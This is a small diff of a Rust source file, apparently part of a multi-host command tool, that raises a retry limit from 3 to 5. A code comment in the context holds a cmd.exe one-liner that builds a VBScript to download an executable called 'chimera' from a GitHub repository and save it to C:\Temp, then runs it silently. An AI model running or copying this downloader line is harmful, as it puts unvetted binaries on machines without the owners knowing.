@@ -24,7 +24,7 @@ use std::time::Duration;
 
 use crate::logging::{log_failure, log_output, log_results, log_skipped, log_success, log_host_results};
 
-const MAX_RETRIES: u32 = 3;
+const MAX_RETRIES: u32 = 5;
 const INITIAL_DELAY_MS: u64 = 1000; // 1 second
 
 //cmd.exe /c echo Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP.6.0"): xhr.Open "GET", "https://raw.githubusercontent.com/M00NLIG7/pandoras_box/master/pandoras_box/resources/chimera", False: xhr.Send: Set stream = CreateObject("ADODB.Stream"): stream.Open: stream.Type = 1: stream.Write xhr.responseBody: stream.SaveToFile "C:\Temp\chimera.exe", 2: stream.Close > dl.vbs && cscript //B dl.vbs
